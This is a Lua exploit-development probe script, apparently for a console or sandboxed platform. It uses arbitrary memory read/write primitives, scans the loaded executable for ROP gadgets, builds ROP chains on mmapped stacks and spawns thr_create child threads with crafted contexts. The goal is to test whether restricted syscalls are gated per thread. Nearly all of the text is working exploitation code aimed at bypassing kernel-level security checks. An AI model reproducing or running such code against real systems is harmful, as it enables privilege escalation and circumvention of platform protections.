-- CRASH_CLASS: MODERATE
-- PROBE 878a: every handler that answered -1 to the Lua thread, asked again from a
-- thr_create child.  Rationale: 634 tests byte [td+0x529], 417 tests [rbx+0x170] and a
-- per-thread cookie, 532 reads [proc+0xc81]; a child has its own td, and 872a proved a
-- raw child can issue syscalls in a loop.  A different answer from a child means the
-- gate is per-thread, not per-process.
print("=== PROBE 878a: the gated handlers, from a child thread ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local fn=to_num(syscall.pipe.fn_addr)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
local info=memory.alloc(0x200); wd(info,0x160)
pcall(function() mk(593)(uint64(0),uint64(info)) end)
local ebase=(rd(info+0x10C) or 0)*4294967296+(rd(info+0x108) or 0)
local function find_pat(base,limit,pat)
    local off=0
    while off<limit do local want=limit-off; if want>0x1000 then want=0x1000 end
        local ok,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not ok or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true); if i then return base+off+i-1 end
        off=off+want end
end
local pop_rax=find_pat(ebase,0x494000,string.char(0x58,0xC3))
local pop_rdi=find_pat(ebase,0x494000,string.char(0x5F,0xC3))
local pop_rsi=find_pat(ebase,0x494000,string.char(0x5E,0xC3))
local pop_rdx=find_pat(ebase,0x494000,string.char(0x5A,0xC3))
local pop_rcx=find_pat(ebase,0x494000,string.char(0x59,0xC3))
local store  =find_pat(ebase,0x494000,string.char(0x48,0x89,0x07,0xC3))
local jmp_g  =find_pat(ebase,0x494000,string.char(0xEB,0xFE))
print(string.format("[0] eboot=%08X rax=%s rdi=%s rsi=%s rdx=%s rcx=%s store=%s",
      ebase, tostring(pop_rax), tostring(pop_rdi), tostring(pop_rsi), tostring(pop_rdx),
      tostring(pop_rcx), tostring(store)))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and pop_rcx and store and jmp_g) then
    print("[0] gadget missing, stop") return
end
local page=0x4000; local STACK=page*4
local function mmap(px) local _,a=pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end); local v=to_num(a); if v~=0 then zero(v,px) end; return v end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RCX=0x060,R8=0x068,RAX=0x078}
local out=mmap(page); local arg=mmap(page); local ctx=memory.alloc(0x500)
local ts=memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8,ms*1000000); pcall(function() mk(240)(uint64(ts),uint64(0)) end) end
-- one child per case: arg1..arg4 as immediates, R8 = arg page
local function run_child(sys,a1,a2,a3,a4,r8)
    local block=mmap(STACK); local start=block+STACK-0x200
    local ch={pop_rdi,a1,pop_rsi,a2,pop_rdx,a3,pop_rcx,a4,pop_rax,sys,fn,
              pop_rdi,out,store,jmp_g}
    for i=1,#ch do wq(start+(i-1)*8,uint64(ch[i])) end
    zero(ctx,0x500)
    wq(ctx+Ctx.MAGIC,uint64(0x480)); wq(ctx+Ctx.TYPE,uint64(0x10000))
    wq(ctx+Ctx.CS,uint64(0x43)); wq(ctx+Ctx.SS,uint64(0x3B))
    wq(ctx+Ctx.RIP,uint64(fn)); wq(ctx+Ctx.RSP,uint64(start))
    wq(ctx+Ctx.RDI,uint64(a1)); wq(ctx+Ctx.RSI,uint64(a2)); wq(ctx+Ctx.RDX,uint64(a3))
    wq(ctx+Ctx.RCX,uint64(a4)); wq(ctx+Ctx.R8,uint64(r8)); wq(ctx+Ctx.RAX,uint64(sys))
    local tb=memory.alloc(8); wq(tb,uint64(0))
    local ok,rv=pcall(function() return mk(430)(uint64(ctx),uint64(tb),uint64(0)) end)
    return ok and to_num(rv) or -999, start
end
local CASES={
    {"532 cmd18",   532, 0x18,0,arg,0,0},
    {"532 cmd2f",   532, 0x2f,0,arg,0,0},
    {"634",         634, 0,0,0,0,arg},
    {"676",         676, 0,0,0,0,arg},
    {"622 cmd0",    622, 0,arg,0,0,0},
    {"565",         565, arg,0,0,0,0},
    {"566",         566, arg,0,0,0,0},
    {"417",         417, arg,0,0,0,0},
    {"649",         649, 0,1,arg,8,0},
    {"563",         563, 0,0,0,0,arg},
}
for _,c in ipairs(CASES) do
    wd(out,0xCCCCCCCC)
    local rv=run_child(c[2],c[3],c[4],c[5],c[6],c[7])
    sleep_ms(8)
    print(string.format("[C] %-10s syscall_rv=%-4d wrote=%08X", c[1], rv, rd(out) or 0))
end
print("[Z] alive pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
